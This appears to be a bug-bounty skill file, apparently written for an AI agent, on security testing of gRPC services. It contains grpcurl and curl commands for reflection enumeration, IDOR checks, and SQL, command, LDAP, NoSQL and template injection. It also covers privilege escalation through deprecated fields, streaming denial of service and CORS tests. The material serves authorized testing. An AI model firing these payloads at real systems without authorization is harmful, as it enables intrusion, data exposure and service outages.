# gRPC Security Testing Skill

**Trigger:** gRPC, protobuf, protocol buffers, grpcui, grpcurl, gRPC streaming, microservice RPC
**Payout Ceiling:** High ($2K–$10K) | **Hunter Density:** Near zero — massive competitive advantage

---

## What Is gRPC

gRPC is a high-performance RPC framework using Protocol Buffers (protobuf) over HTTP/2.
Used extensively in modern backends, especially: crypto platforms, AI systems, fintech microservices.
Most hunters don't know how to test it → **near-zero duplicate risk**.

---

## Tool Setup

```bash
# Install grpcurl (like curl for gRPC)
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Install grpcui (browser GUI for gRPC — like Swagger/Postman)
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest

# Install Burp gRPC plugin (intercept and modify gRPC in Burp)
# BApp Store: search "gRPC" → "gRPC Decoder"
```

---

## Discovery Phase

### Find gRPC Endpoints
```bash
# Common gRPC ports
# Default: 50051 (insecure), 443 (TLS), custom ports
nmap -p 50051,50052,9090,8080 target.com

# Look for gRPC in:
# - HTTP/2 traffic (H2 with binary content-type headers)
# - Content-Type: application/grpc in Burp HTTP history
# - TLS SNI with backend hostnames
# - Mobile app traffic via mitmproxy
```

### Check for Reflection API (gRPC equivalent of GraphQL introspection)
```bash
# Try gRPC server reflection — if enabled, lists ALL services and methods
grpcurl -plaintext target.com:50051 list
# Lists available services

grpcurl -plaintext target.com:50051 list [ServiceName]
# Lists all methods in that service

grpcurl -plaintext target.com:50051 describe [ServiceName.MethodName]
# Describes request/response proto types

# With TLS
grpcurl -insecure target.com:443 list
```

### If Reflection Disabled — Extract Protos from APK/Source
```bash
# Android APK: extract .proto files
# jadx decompile → search for .proto resource files
# OR look for protobuf-generated classes: *.Stub, *.ServiceGrpc

# Web frontend: look for compiled protobuf JS in source maps
# grpc-web builds include proto definitions as JS
```

---

## Vulnerability Checklist

### Check 1: Missing Authentication on gRPC Methods
```bash
# Call methods without auth header
grpcurl -plaintext -d '{}' target.com:50051 com.target.UserService/GetUsers
grpcurl -plaintext -d '{"user_id": "1"}' target.com:50051 com.target.AdminService/GetAdminDashboard

# If response returns data without auth → HIGH finding
# Missing auth on streaming endpoints especially common
```

### Check 2: gRPC BOLA/IDOR (Same as REST IDOR, different format)
```bash
# Test with different user IDs — same as REST IDOR
grpcurl -plaintext \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"user_id": "OTHER_USER_ID"}' \
  target.com:50051 com.target.ProfileService/GetProfile

# Does it return another user's profile? → IDOR
```

### Check 3: Type Confusion via Malformed Protos
```bash
# Send wrong types for fields
grpcurl -plaintext -d '{"amount": "not_a_number"}' target.com:50051 PaymentService/Charge
grpcurl -plaintext -d '{"user_id": -1}' target.com:50051 UserService/GetUser
grpcurl -plaintext -d '{"count": 9999999999}' target.com:50051 OrderService/BulkCreate

# Watch for server errors that reveal internal paths or crash the service
```

### Check 4: Server Streaming BOLA (Data Exfil)
```bash
# Streaming methods can return LARGE amounts of data if IDOR present
grpcurl -plaintext \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{}' \
  target.com:50051 ReportService/StreamAllTransactions
# Should only return YOUR transactions — if returns all users' → Critical data breach
```

### Check 5: Injection in gRPC Fields
```bash
# Try SQL injection in string fields
grpcurl -plaintext -d '{"search": "test'"'"' OR 1=1--"}' target.com:50051 SearchService/Search

# Try command injection in fields that look like they might exec
grpcurl -plaintext -d '{"hostname": "google.com;id"}' target.com:50051 DiagnosticService/Ping

# Try template injection
grpcurl -plaintext -d '{"template": "{{7*7}}"}' target.com:50051 TemplateService/Render
```

### Check 6: gRPC-Web Transcoding Bugs
```bash
# gRPC-Web proxies translate HTTP/1.1 → gRPC
# Path: /com.target.ServiceName/MethodName
# Attack: inject gRPC metadata via HTTP headers
curl -X POST https://target.com/grpc/com.target.UserService/GetUser \
  -H "Content-Type: application/grpc-web+proto" \
  -H "grpc-metadata-user-id: ADMIN_ID" \
  --data-binary $'\x00\x00\x00\x00\x04\x08\x01'  # protobuf: {user_id: 1}
```

---

## Burp Integration

```
1. Install Burp gRPC Decoder extension
2. Enable Burp as HTTP/2 proxy
3. Set up gRPC client to use Burp as proxy:
   grpcurl -plaintext -vv \
     -proto service.proto \
     -authority target.com \
     localhost:50051 [method]
4. Intercept gRPC messages in Burp → modify proto fields → forward
```

---

## grpcui (Browser-Based Testing)

```bash
# Launch browser UI pointing at target
grpcui -plaintext target.com:50051

# Opens browser at localhost:PORT with Swagger-like interface
# Fill in method arguments → send → see response
# Much easier than manual grpcurl for complex protos
```

---

## Report Evidence Standard
- **Screenshot:** grpcurl command + response showing unauthorized data
- **For IDOR:** Show two accounts, one accessing other's resources
- **For missing auth:** Show unauthenticated grpcurl call + data returned
- **CVSS:** Same as equivalent REST finding (IDOR = 6.5–8.0, missing auth = 7.5–9.1)

---

---

## Advanced Techniques (KB Part 2)

### gRPC-Scan — Extract Proto Definitions from JS Bundles
```bash
# gRPC-Scan parses compiled JS bundles to extract service/method names + field types
# When reflection is disabled and you have no APK:
# 1. Find JS bundle URLs in browser devtools (webpack chunks)
# 2. Feed to gRPC-Scan to reconstruct proto schema
# Useful for gRPC-Web (browser-facing) services where proto is compiled into JS
```

### LDAP Injection via gRPC Fields
```bash
# Test string fields with LDAP metacharacters
grpcurl -plaintext -d '{"search": "*)(uid=*))(|(uid=*"}' target:50051 DirectoryService/Search
grpcurl -plaintext -d '{"username": "admin)(|(password=*"}' target:50051 AuthService/Login
```

### NoSQL Injection via JSON-over-Proto
```bash
# If proto fields contain JSON structures passed to MongoDB:
grpcurl -plaintext -d '{"filter": "{\"$gt\": \"\"}"}' target:50051 DataService/Query
grpcurl -plaintext -d '{"user_id": {"$ne": null}}' target:50051 UserService/GetUser
```

### Deprecated Field Privilege Escalation
```bash
# Protobuf fields marked [deprecated=true] are still deserialized
# If server code still processes deprecated fields, sending them may trigger privilege escalation
# Example: is_admin field deprecated but server still honors it
grpcurl -plaintext -d '{"user_id": "123", "name": "attacker", "is_admin": true}' \
  target:50051 pkg.UserService/UpdateUser
# If response grants admin access → High/Critical finding
```

### Resource Exhaustion / Streaming DoS
```bash
# Open many bidirectional streams and send nothing — idle stream exhaustion
# Send unlimited data on a single stream — memory exhaustion
# Repeated large field values in proto (no built-in size limits)

# Payload bomb: 10MB string in a single repeated field
python3 -c "
import grpc
# Build request with massive payload:
# name = 'A' * 10_000_000
# Send and observe if server OOMs or becomes unresponsive
"

# IMPORTANT: Only test DoS in authorized programs that permit it
```

### gRPC-Web CORS Misconfiguration
```bash
# Test if gRPC-Web endpoint reflects arbitrary Origin with credentials
curl -i -X OPTIONS https://target.tld/pkg.svc.v1.Service/Method \
  -H 'Origin: https://evil.tld' \
  -H 'Access-Control-Request-Method: POST'
# Vulnerable: Access-Control-Allow-Origin: https://evil.tld
#           + Access-Control-Allow-Credentials: true
# This enables cross-site gRPC requests → same impact as CORS misconfiguration
```

### gRPC-Web Frame Manipulation
```bash
# Decode a gRPC-Web-text encoded request:
echo "AAAAABYSC0FtaW4gTmFzaXJpGDY6BVhlbm9u" | python3 grpc-coder.py --decode --type grpc-web-text | protoscope > out.txt

# Modify the decoded proto, re-encode, re-send:
protoscope -s modified.txt | python3 grpc-coder.py --encode --type grpc-web-text > body.b64
curl -i https://target.tld/pkg.svc.v1.Service/Method \
  -H 'Content-Type: application/grpc-web-text' \
  -H 'X-Grpc-Web: 1' \
  --data-binary @body.b64
```

### Real-World Reference
```
HTB PC Machine: gRPC SQLi via 'id' field — requires token auth first
Attack path: enum reflection → get token from another service → SQLi on id field
Tool: grpcurl + sqlmap (point sqlmap at a wrapper script)
```

## Extended Tool Reference

| Tool | Purpose | Install |
|------|---------|---------|
| grpcurl | CLI gRPC client (like curl) | `go install github.com/fullstorydev/grpcurl/...@latest` |
| grpcui | Browser GUI for gRPC | `go install github.com/fullstorydev/grpcui/...@latest` |
| grpc_cli | Google's gRPC CLI | ships with grpc C++ library |
| Burp gRPC-Web Coder | Intercept + modify gRPC-Web frames | BApp Store |
| protoscope | Inspect/modify raw protobuf binary | `go install github.com/protocolbuffers/protoscope/...@latest` |
| gRPC-Scan | Extract protos from compiled JS bundles | GitHub: ghostunnel/grpc-scan |
| grpc-fuzz | Automated gRPC endpoint fuzzing | GitHub: ioFog/grpc-fuzz |
| StackHawk | DAST scanner with gRPC/protobuf schema support | stackhawk.com |

## Attack Chain Paths

- gRPC reflection enabled → full service enumeration → targeted injection
- gRPC SQLi → DB dump → credential exfil → account takeover
- gRPC auth bypass → admin endpoints → data manipulation
- gRPC deprecated field abuse → privilege escalation
- gRPC streaming DoS → service unavailability → SLA breach
- H2C smuggling → gRPC internal service access → SQLi on internal gRPC backend

## References

- IBM gRPC security series: https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9
- HackTricks gRPC-Web: https://book.hacktricks.xyz/pentesting-web/grpc-web-pentest
- CVE-2024-7254 protobuf-java ReDoS: https://github.com/grpc/grpc-java/issues/11542
- StackHawk gRPC security: https://www.stackhawk.com/blog/best-practices-for-grpc-security/

---

*Enhanced by KB Part 2 ingestion 2026-03-04*

*Skill: grpc-security | Created 2026-03-04 | GAP-C from strategic study | Near-zero hunter coverage | Ceiling: High ($2K–$10K)*
